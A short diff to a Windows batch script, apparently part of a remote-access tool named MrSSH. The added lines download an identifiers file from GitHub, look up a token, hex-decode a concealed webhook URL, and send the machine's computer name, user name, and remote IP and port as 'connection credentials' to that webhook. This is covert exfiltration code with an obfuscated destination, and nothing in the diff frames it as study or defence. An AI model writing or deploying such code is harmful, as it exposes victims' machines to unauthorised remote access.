@@ -6,6 +6,10 @@ for /f "tokens=8 delims==" %%a in ("!Result!") do (
     for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
 )
 
-set "webhook="
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
+FOR /F "delims=" %F IN (tokenName.txt) DO SET token=%F
+FOR /F "tokens=* USEBACKQ" %F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%F)
+set "hexwebhook=%hexwebhook:~-244%"
+FOR /F "tokens=* USEBACKQ" %F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%F)
 
 Source.bat +silent --embed "Connection credentials for %computername%\%username%:" ":satellite_orbital: **IP and port:** !RemoteURL!" "FFFDBC"
